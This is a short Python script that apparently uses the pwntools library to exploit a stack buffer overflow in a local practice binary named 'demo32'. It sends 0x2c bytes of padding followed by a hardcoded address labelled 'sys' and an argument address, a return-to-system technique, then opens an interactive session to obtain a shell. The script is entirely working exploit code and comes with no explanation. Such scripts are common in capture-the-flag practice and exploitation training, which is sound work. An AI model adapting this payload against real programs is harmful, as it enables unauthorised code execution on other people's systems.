from pwn import *

context.log_level = "debug"

io = process("./demo32")
pause()
io.recv()

sys = 0x080484a5
pause()
payload = b"A"*0x2c + p32(sys) +p32(0x804a024)
io.sendline(payload)
pause()

io.interactive()
